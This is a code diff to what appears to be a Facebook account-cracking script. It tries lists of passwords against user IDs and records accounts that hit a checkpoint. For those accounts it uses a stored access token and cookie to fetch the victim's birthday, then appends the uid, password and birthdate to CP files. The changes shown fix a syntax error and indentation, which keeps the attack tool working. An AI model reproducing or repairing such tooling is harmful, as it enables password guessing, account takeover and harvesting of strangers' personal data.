@@ -942,8 +942,7 @@ def api(uid, fii):
         ua = open("ua", "r").read()
     except IOError:
         ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
-    global ok, cp, loop, token
-#    sys.stdout.write("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(loop,len(id),len(ok),len(cp)));sys.stdout.flush()
+    global ok, cp, loop, token, cookie
     sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
     for pw in fii:
         pw = pw.lower()
@@ -957,15 +956,15 @@ def api(uid, fii):
             break
         elif "www.facebook.com" in send.json()["error_msg"]:
             try:
-              token  = open('login/token.json','r').read()
-              cookie = {'cookie':open('login/cookie.json','r').read()}
-              ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)cookies=cookie).json()["birthday"]
-              month, day, year = ttl.split("/")
-              month = _bulan_[month]
-              print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-              cp.append("%s|%s"%(uid, pw))
-              open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
-              break
+                token  = open('login/token.json','r').read()
+                cookie = {'cookie':open('login/cookie.json','r').read()}
+                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
+                month, day, year = ttl.split("/")
+                month = _bulan_[month]
+                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
+                cp.append("%s|%s"%(uid, pw))
+                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+                break
             except (KeyError, IOError):
                 day = (" ")
                 month = (" ")
